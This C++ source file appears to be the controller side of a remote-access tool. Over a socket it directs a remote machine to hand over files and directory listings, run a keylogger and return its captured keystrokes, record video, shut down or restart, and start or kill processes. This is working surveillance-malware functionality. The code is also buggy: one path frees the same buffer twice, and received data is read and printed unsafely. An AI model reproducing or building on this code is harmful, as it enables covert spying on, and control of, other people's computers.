#include "HandleFeature.hpp"

#include <fstream>
#include <iostream>
#include <random>

void Feature::sendRequest(int type, int size, char *data) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<uint16_t> dis(0, UINT16_MAX);
    PacketHeader header{};
    header.request_id = dis(gen);
    header.request_type = type;
    header.request_key = requestKey;
    header.packet_size = sizeof(PacketHeader) + size;

    // Send the header
    send(sock, reinterpret_cast<const char *>(&header), sizeof(header), 0);
    send(sock, data, size, 0);
}

int Feature::receiveResponse(int &size, char **data) {
    *data = nullptr;
    ResponseHeader responseHeader{};
    int bytesReceived = recv(sock, reinterpret_cast<char *>(&responseHeader), sizeof(responseHeader), 0);
    if (bytesReceived <= 0) {
        return -1;
    }
    *data = new char[responseHeader.packageSize - sizeof(responseHeader)];
    size = responseHeader.packageSize - sizeof(responseHeader);
    bytesReceived = recv(sock, *data, size, 0);
    if (bytesReceived <= 0) {
        delete[] *data;
        *data = nullptr;
        return -1;
    }
    return responseHeader.statusCode;
}

DWORD FileFeature::requestingFeature(LPVOID lpParam) {
    returnValue = -1;
    auto param = static_cast<RequestParam *>(lpParam);
    if (param == nullptr) {
        return -1;
    }
    if (param->path == nullptr) {
        return -1;
    }
    if (param->size <= 0) {
        return -1;
    }
    if (param->type == 0) {
        if (param->saveFilePath == nullptr || param->saveFileSize <= 0) {
            std::cerr << "Invalid save file path or size." << std::endl;
            return -1;
        }
        sendRequest(param->type, param->size, param->path);
        int responseSize = 0;
        char *responseData = nullptr;
        int res = receiveResponse(responseSize, &responseData);
        if (res < 0) {
            std::cerr << "Failed to receive response for file request." << std::endl;
            return -1;
        }
        std::ofstream outFile(param->saveFilePath, std::ios::binary);
        if (!outFile) {
            std::cerr << "Failed to open file for writing: " << param->saveFilePath << std::endl;
            delete[] responseData;
            return -1;
        }
        outFile.write(responseData, responseSize);
        outFile.close();
        delete[] responseData;
        returnValue = 0;
        return 0;
    }
    if (param->type == 1) {
        sendRequest(param->type, param->size, param->path);
        int responseSize = 0;
        char *responseData = nullptr;
        int res = receiveResponse(responseSize, &responseData);
        if (res < 0) {
            std::cerr << "Failed to receive response for file list request." << std::endl;
            return -1;
        }
        std::cout << "Received file list: " << responseData << std::endl;
        delete[] responseData;
        returnValue = 0;
        return 0;
    }
    std::cerr << "Invalid request type: " << param->type << std::endl;
    return -1;
}

DWORD KeyloggerFeature::requestingFeature(LPVOID lpParam) {
    returnValue = -1;
    auto param = static_cast<RequestParam *>(lpParam);
    if (param == nullptr) {
        return -1;
    }
    if (param->type <= 0) {
        std::cerr << "Invalid request type for keylogger feature: " << param->type << std::endl;
        return -1;
    }
    sendRequest(param->type, 0, nullptr);
    int responseSize = 0;
    char *responseData = nullptr;
    int res = receiveResponse(responseSize, &responseData);
    if (res == 0x01) {
        std::cerr << "Keylogger is already running." << std::endl;
        if (responseData != nullptr) {
            delete[] responseData;
        }
        return returnValue = res;
    }
    if (res == 0x02) {
        std::cerr << "Failed to start keylogger." << std::endl;
        if (responseData != nullptr) {
            delete[] responseData;
        }
        return returnValue = res;
    }
    if (res == 0x00) {
        if (param->type == 1)
            std::cout << "Keylogger started successfully." << std::endl;
        else if (param->type == 2) {
            std::cout << "Keylogger stopped successfully." << std::endl;
        }
        if (responseData != nullptr) {
            delete[] responseData;
        }
        return returnValue = res;
    }
    if (res == 0x03) {
        std::cerr << "Keylogger is not running." << std::endl;
        if (responseData != nullptr) {
            delete[] responseData;
        }
        return returnValue = res;
    }
    if (res == 0x04) {
        std::cout << responseData << std::endl;
        if (responseData != nullptr) {
            delete[] responseData;
        }
        return returnValue = res;
    }
    if (responseData != nullptr) {
        delete[] responseData;
        }
    std::cerr << "Unknown response status code: " << res << std::endl;
    delete[] responseData;
    return -1;
}

DWORD VideoFeature::requestingFeature(LPVOID lpParam) {
    returnValue = -1;
    auto param = static_cast<RequestParam *>(lpParam);
    if (param == nullptr) {
        return -1;
    }
    if (param->type <= 0) {
        std::cerr << "Invalid request type for keylogger feature: " << param->type << std::endl;
        return -1;
    }
    sendRequest(param->type, 0, nullptr);
    int responseSize = 0;
    char *responseData = nullptr;
    int res = receiveResponse(responseSize, &responseData);
    if (res == 0x01) {
        std::cerr << "Invalid request key for video recording." << std::endl;
        if (responseData != nullptr) {
            delete[] responseData;
        }
        return returnValue = res;
    }
    if (res == 0x02) {
        std::cerr << "Video recording is already in progress." << std::endl;
        if (responseData != nullptr) {
            delete[] responseData;
        }
        return returnValue = res;
    }
    if (res == 0x00) {
        if (param->type == 1) {
            std::cout << "Video recording started successfully." << std::endl;
        } else if (param->type == 2) {
            std::cout << "Video recording stopped successfully." << std::endl;
        }
        if (responseData != nullptr) {
            delete[] responseData;
        }
        return returnValue = res;
    }
    if (res == 0x03) {
        std::cerr << "Video recording is not in progress." << std::endl;
        if (responseData != nullptr) {
            delete[] responseData;
        }
        return returnValue = res;
    }
    if (res == 0x04) {
        std::cout << "Invalid request type for video recording." << std::endl;
        if (responseData != nullptr) {
            delete[] responseData;
        }
        return returnValue = res;
    }
    if (responseData != nullptr) {
        delete[] responseData;
    }
    std::cerr << "Unknown response status code: " << res << std::endl;
    return -1;
}

DWORD WindowFeature::requestingFeature(LPVOID lpParam) {
    returnValue = -1;
    auto param = static_cast<RequestParam *>(lpParam);
    if (param == nullptr) {
        return -1;
    }
    if (param->type <= 0) {
        std::cerr << "Invalid request type for window feature: " << param->type << std::endl;
        return -1;
    }
    sendRequest(param->type, 0, nullptr);
    int responseSize = 0;
    char *responseData = nullptr;
    int res = receiveResponse(responseSize, &responseData);
    if (res == 0x01) {
        std::cerr << "Invalid request key for window command." << std::endl;
        if (responseData != nullptr) {
            delete[] responseData;
        }
        return returnValue = res;
    }
    if (res == 0x02) {
        std::cerr << "Unable to open process token for shutdown/restart." << std::endl;
        if (responseData != nullptr) {
            delete[] responseData;
        }
        return returnValue = res;
    }
    if (res == 0x03) {
        std::cerr << "Failed to set Master Volumn." << std::endl;
        if (responseData != nullptr) {
            delete[] responseData;
        }
        return returnValue = res;
    }
    if (res == 0x00) {
        if (param->type == 1) {
            std::cout << "Shutdown command executed successfully." << std::endl;
        } else if (param->type == 2) {
            std::cout << "Restart command executed successfully." << std::endl;
        } else if (param->type == 3) {
            std::cout << "Master Volumn set successfully." << std::endl;
        }
        if (responseData != nullptr) {
            delete[] responseData;
        }
        return returnValue = res;
    }
    std::cerr << "Unknown response status code: " << res << std::endl;
    if (responseData != nullptr) {
        delete[] responseData;
    }
    return -1;
}

DWORD ProcessFeature::requestingFeature(LPVOID lpParam) {
    returnValue = -1;
    auto param = static_cast<RequestParam *>(lpParam);
    if (param == nullptr) {
        return -1;
    }
    if (param->type <= 0) {
        std::cerr << "Invalid request type for process feature: " << param->type << std::endl;
        return -1;
    }
    sendRequest(param->type, param->size, param->data);
    int responseSize = 0;
    char *responseData = nullptr;
    int res = receiveResponse(responseSize, &responseData);
    if (res == 0x01) {
        std::cerr << "Failed to terminate process." << std::endl;
        if (responseData != nullptr) {
            delete[] responseData;
        }
        return returnValue = res;
    }
    if (res == 0x02) {
        std::cerr << "Failed to start process." << std::endl;
        if (responseData != nullptr) {
            delete[] responseData;
        }
        return returnValue = res;
    }
    if (res == 0x03) {
        std::cerr << "Unknown process type." << std::endl;
        if (responseData != nullptr) {
            delete[] responseData;
        }
        return returnValue = res;
    }
    if (res == 0x00) {
        if (param->type == 1) {
            std::cout << "Process terminated successfully." << std::endl;
        } else if (param->type == 2) {
            std::cout << "Process started successfully." << std::endl;
        } else if (param->type == 3) {
            std::cout << "Process list received successfully." << std::endl;
        }
        if (responseData != nullptr) {
            delete[] responseData;
        }
        return returnValue = res;
    }
    std::cerr << "Unknown response status code: " << res << std::endl;
    if (responseData != nullptr) {
        delete[] responseData;
    }
    return -1;
}
